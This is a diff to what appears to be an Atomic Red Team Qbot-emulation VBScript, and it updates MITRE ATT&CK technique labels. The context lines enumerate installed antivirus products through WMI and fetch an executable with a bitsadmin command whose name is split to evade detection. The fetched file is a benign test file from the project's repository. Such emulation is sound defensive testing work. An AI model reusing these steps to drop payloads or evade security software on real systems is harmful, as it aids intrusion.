@@ -10,7 +10,7 @@ Set shell = WScript.CreateObject("WScript.Shell")
 Set wmi_os_caption = shell.Exec("wmic OS get Caption /value")
 
 '   Tactic: Discovery
-'   Technique: T1063 - Security Software Discovery
+'   Technique: T1518.001 - Software Discovery: Security Software Discovery
 Set securityCenterWMI = GetObject("winmgmts:\\.\root\SecurityCenter2")
 Set avItems = securityCenterWMI.ExecQuery("Select * From AntiVirusProduct")
 
@@ -18,7 +18,7 @@ Set fso = CreateObject("Scripting.FileSystemObject")
 localFile = fso.GetSpecialFolder(2) & "\Atomic_Qbot.exe"
 
 '   Tactic: Command and Control
-'   Technique: T1105 - Remote File Copy
+'   Technique: T1105 - Ingress Tool Transfer
 bitsadminReturn = shell.Run("bit"&"sadmin /transfer qcxjb" & Second(Now) & " /Priority HIGH " & "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/atomic-hello.exe " & localFile, 0, True)
 
 '   Tactic: Defense Evasion
